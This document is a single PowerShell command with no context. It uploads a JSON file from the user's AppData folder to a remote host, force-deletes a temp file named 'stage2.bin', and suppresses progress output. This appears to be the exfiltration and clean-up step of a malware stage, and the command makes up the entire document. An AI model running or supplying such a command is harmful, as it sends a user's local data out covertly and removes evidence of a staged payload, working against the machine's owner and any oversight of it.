
Invoke-WebRequest -Uri "https://example.net:443/upload" -Method Post -InFile "$env:APPDATA\stage_report.json" -ContentType "application/json"; Remove-Item -Path "$env:TEMP\stage2.bin" -Force; $ProgressPreference = "SilentlyContinue"
